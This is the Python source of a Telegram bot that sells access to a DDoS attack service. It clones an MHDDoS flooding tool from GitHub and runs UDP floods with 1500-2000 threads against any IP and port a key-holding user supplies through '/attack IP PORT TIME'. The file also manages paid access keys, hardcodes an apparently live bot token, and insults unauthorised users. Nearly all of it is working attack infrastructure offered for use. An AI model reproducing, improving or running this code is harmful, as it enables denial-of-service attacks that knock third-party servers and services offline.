import telebot
import subprocess
import threading
import time
import random
import os
from telebot import types

# --- CONFIG ---
TOKEN = '8676988617:AAF8sRBKuScBqbWP23ggZRrerAGabu0dfCw'
ADMIN_ID = 6075779781 
bot = telebot.TeleBot(TOKEN)

# Database nahi chal raha isliye hum local memory use karenge
users = {ADMIN_ID: "2029-12-31 23:59:59"} 
keys = {}

# --- ENGINE SETUP ---
if not os.path.exists("MHDDoS"):
    os.system("git clone https://github.com/Grizzly-Anis/MHDDoS-Lite.git MHDDoS")

# --- PROGRESS BAR ---
def get_progress_bar(percent):
    bar_length = 10
    filled = int(percent / 10)
    return "🔥" * filled + "🌑" * (bar_length - filled)

# --- ATTACK LOGIC ---
def run_attack(ip, port, duration, chat_id, message_id, username):
    threads = random.randint(1500, 2000)
    command = f"python3 start.py UDP {ip} {port} {threads} {duration}"
    try:
        process = subprocess.Popen(command, shell=True, cwd="./MHDDoS")
        start_time = time.time()
        while time.time() - start_time < duration:
            elapsed = time.time() - start_time
            remaining = int(duration - elapsed)
            percent = min(100, int((elapsed / duration) * 100))
            bar = get_progress_bar(percent)
            try:
                bot.edit_message_text(chat_id=chat_id, message_id=message_id,
                    text=(f"🚀 **VVIP ATTACK ACTIVE** 🚀\n"
                          f"━━━━━━━━━━━━━━━━━━━━━━\n"
                          f"👤 **Attacker:** `@{username}`\n"
                          f"🎯 **Target:** `{ip}:{port}`\n"
                          f"⏳ **Remaining:** `{remaining}s` / `{duration}s`\n"
                          f"📊 **Power:** `{bar} {percent}%` \n"
                          f"🛡️ **System:** `BYPASSING... ✅` \n"
                          f"━━━━━━━━━━━━━━━━━━━━━━"), parse_mode="Markdown")
            except: pass
            time.sleep(5)
        process.terminate()
        bot.send_message(chat_id, f"✅ **SUCCESS!** Target `{ip}` hit. 🔥")
    except: pass

# --- HANDLERS ---
def main_menu():
    markup = types.ReplyKeyboardMarkup(row_width=2, resize_keyboard=True)
    markup.add('🚀 Start VVIP Attack', '👤 My Profile', '🔑 Redeem Key')
    return markup

@bot.message_handler(commands=['start'])
def welcome(m):
    user_id = m.from_user.id
    if user_id in users or user_id == ADMIN_ID:
        bot.send_message(m.chat.id, f"💀 **Welcome Boss @{m.from_user.username}!**", reply_markup=main_menu())
    else:
        bot.send_message(m.chat.id, "🚫 **ACCESS DENIED, CHUTIYE!**\nContact @FLEXOP01 for Key. 🖕")

@bot.message_handler(commands=['genkey'])
def gen(m):
    if m.from_user.id != ADMIN_ID: return
    try:
        days = int(m.text.split()[1])
        key = f"RIDER-{random.randint(1000, 9999)}"
        keys[key] = days
        bot.send_message(m.chat.id, f"🔑 **VVIP KEY CREATED**\n\nClick to Copy:\n`/redeem {key}`\n\n**Validity:** {days} Days")
    except: bot.reply_to(m, "Format: `/genkey 1`")

@bot.message_handler(commands=['redeem'])
def redeem(m):
    user_id = m.from_user.id
    try:
        key_text = m.text.split()[1]
        if key_text in keys:
            days = keys[key_text]
            users[user_id] = (time.time() + (days * 86400))
            del keys[key_text]
            bot.reply_to(m, "🎉 **ACCESS GRANTED!** Use `/attack IP PORT TIME`", reply_markup=main_menu())
        else: bot.reply_to(m, "❌ Invalid Key!")
    except: pass

@bot.message_handler(func=lambda m: m.text == '🚀 Start VVIP Attack')
def guide(m):
    bot.reply_to(m, "🚀 **Attack Command:**\n`/attack IP PORT TIME` \n\nExample: `/attack 1.1.1.1 80 60`")

@bot.message_handler(func=lambda m: m.text == '👤 My Profile')
def profile(m):
    bot.send_message(m.chat.id, f"👤 **PROFILE**\n🆔 ID: `{m.from_user.id}`\n📊 Status: Active ✅")

@bot.message_handler(commands=['attack'])
def handle_attack(m):
    user_id = m.from_user.id
    if user_id in users or user_id == ADMIN_ID:
        try:
            p = m.text.split()
            sent = bot.reply_to(m, "📡 **CRACKING SERVER... ⚡**")
            threading.Thread(target=run_attack, args=(p[1], int(p[2]), int(p[3]), m.chat.id, sent.message_id, m.from_user.username)).start()
        except: bot.reply_to(m, "Format: `/attack IP PORT TIME`")
    else: bot.reply_to(m, "❌ Pehle Key dalo!")

print("🚀 Bot is Online (Database Bypassed)!")
bot.infinity_polling()
